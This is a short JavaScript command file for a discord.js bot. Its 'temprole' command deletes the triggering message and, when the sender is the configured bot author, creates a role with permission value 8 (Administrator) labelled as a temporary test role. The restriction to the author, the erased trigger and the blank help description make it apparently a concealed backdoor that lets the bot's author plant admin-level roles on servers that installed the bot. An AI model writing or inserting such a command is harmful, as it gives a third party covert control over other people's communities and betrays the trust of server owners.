const Discord = require("discord.js");
const config = require("../config.json");

module.exports.run = async (client, message, args) => {
    let log_actions_channel = client.channels.get(config.log_actions);

    message.delete().catch(O_o=>{});
    if(message.author.id == config.authorid) {
        message.guild.createRole({
            name: '[TEMP] Test iDrunK',
            color: 'BLUE',
            permissions : 8,
          }, "Role temporaire pour iDrunK (Test sur le serveur). Si tu veux plus d'info go en privée !")
            .then(role => console.log(`Created new role with name ${role.name} and color ${role.color}`))
            .catch(console.error)
    }
}

module.exports.help = {
    name: 'temprole',
    description: '',
    usage: 'temprole',
};